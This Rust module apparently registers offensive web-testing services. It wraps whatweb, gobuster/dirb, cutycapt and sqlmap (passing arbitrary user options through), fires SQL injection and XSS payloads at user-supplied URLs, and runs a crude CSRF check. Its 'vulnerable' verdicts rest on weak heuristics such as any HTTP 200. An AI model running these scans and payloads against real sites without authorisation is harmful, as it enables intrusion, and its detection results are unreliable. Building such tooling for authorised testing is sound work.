use crate::services::ServiceRegistry;
use crate::utils::process;

pub(crate) fn xss_payload_for_type(payload_type: &str) -> &'static str {
    match payload_type {
        "basic" => "<script>alert('XSS')</script>",
        "img" => "<img src=x onerror=alert('XSS')>",
        "svg" => "<svg onload=alert('XSS')>",
        _ => "<script>alert('XSS')</script>",
    }
}

pub fn register(registry: &mut ServiceRegistry) {
    registry.register("Security.Offensive.Web.TechStack", |params| async move {
        let url: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("url").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing url"))?,
        )?;

        let output = process::exec_command(&["whatweb", &url]).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.Web.DirectoryBruteForce", |params| async move {
        let url: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("url").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing url"))?,
        )?;

        let wordlist: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("wordlist").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing wordlist"))?,
        )?;

        let output = if process::exec_command(&["which", "gobuster"]).await.is_ok() {
            process::exec_command(&["gobuster", "dir", "-u", &url, "-w", &wordlist]).await?
        } else {
            process::exec_command(&["dirb", &url, &wordlist]).await?
        };

        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.Web.Screenshot", |params| async move {
        let urls: Vec<String> = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("urls").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing urls"))?,
        )?;

        let mut screenshots = Vec::new();
        for url in urls {
            let output_file = format!("/tmp/screenshot_{}.png", chrono::Utc::now().timestamp_millis());
            if process::exec_command(&["cutycapt", "--url", &url, "--out", &output_file]).await.is_ok() {
                screenshots.push(output_file);
            }
        }

        Ok(serde_json::to_value(&screenshots)?)
    });

    registry.register("Security.Offensive.Web.SQLi.Test", |params| async move {
        let url: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("url").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing url"))?,
        )?;

        let parameter: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("parameter").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing parameter"))?,
        )?;

        let test_payload = "' OR '1'='1";
        let test_url = format!("{}?{}={}", url, parameter, test_payload);
        let response = reqwest::get(&test_url).await?;
        let status = response.status().as_u16();

        Ok(serde_json::json!({
            "vulnerable": status == 200,
            "status": status
        }))
    });

    registry.register("Security.Offensive.Web.SQLi.Sqlmap", |params| async move {
        let url: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("url").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing url"))?,
        )?;

        let options: Option<String> = params
            .as_ref()
            .and_then(|p| p.get("options").cloned())
            .and_then(|v| serde_json::from_value(v).ok());

        let mut cmd = vec!["sqlmap", "-u", &url, "--batch"];
        if let Some(ref opts) = options {
            for opt in opts.split_whitespace() {
                cmd.push(opt);
            }
        }

        let output = process::exec_command(&cmd).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.Web.XSS.Test", |params| async move {
        let url: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("url").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing url"))?,
        )?;

        let parameter: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("parameter").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing parameter"))?,
        )?;

        let test_payload = "<script>alert('XSS')</script>";
        let test_url = format!("{}?{}={}", url, parameter, test_payload);
        let response = reqwest::get(&test_url).await?;
        let body = response.text().await?;

        Ok(serde_json::json!({
            "vulnerable": body.contains("<script>alert('XSS')</script>"),
            "response": body
        }))
    });

    registry.register("Security.Offensive.Web.XSS.Payload.Generate", |params| async move {
        let payload_type: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("type").cloned())
                .unwrap_or(serde_json::Value::String("basic".to_string())),
        )?;

        Ok(serde_json::json!({ "payload": xss_payload_for_type(&payload_type) }))
    });

    registry.register("Security.Offensive.Web.CSRF.Test", |params| async move {
        let url: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("url").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing url"))?,
        )?;

        let _action: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("action").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing action"))?,
        )?;

        let response = reqwest::get(&url).await?;
        let body = response.text().await?;
        let has_csrf_token = body.contains("csrf") || body.contains("_token") || body.contains("authenticity_token");

        Ok(serde_json::json!({
            "vulnerable": !has_csrf_token,
            "has_protection": has_csrf_token
        }))
    });
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn xss_payload_for_type_variants() {
        assert!(xss_payload_for_type("basic").contains("<script>"));
        assert!(xss_payload_for_type("img").contains("<img"));
        assert!(xss_payload_for_type("svg").contains("<svg"));
        assert_eq!(xss_payload_for_type("unknown"), xss_payload_for_type("basic"));
    }
}
